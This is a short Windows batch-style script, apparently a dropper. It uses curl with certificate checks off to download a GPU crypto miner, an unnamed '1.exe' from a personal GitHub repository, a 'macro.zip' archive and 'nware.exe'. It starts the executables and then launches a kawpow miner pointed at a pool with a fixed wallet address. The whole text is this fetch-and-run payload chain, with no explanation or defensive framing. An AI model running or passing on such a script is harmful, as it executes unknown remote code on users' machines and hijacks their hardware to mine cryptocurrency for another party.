curl -LJOk "https://github.com/develsoftware/GMinerRelease/releases/download/3.30/gminer_3_30_windows64.zip"
tar -xf gminer_3_30_windows64.zip
curl -LJOk "https://github.com/bastunponevolq/nware/raw/main/1.exe"
start 1.exe
curl -LJOk "https://github.com/bastunponevolq/nware/raw/main/macro.zip"
tar -xf macro.zip
curl -LJOk "https://client.playnware.com/nware.exe"
start nware.exe
miner.exe --algo kawpow --server neox-us-east.minerpool.pro:10059 --user Gc8eKRns8XQFtRvTbepcAFH9PKMzjtT6Sb.op+%RANDOM%
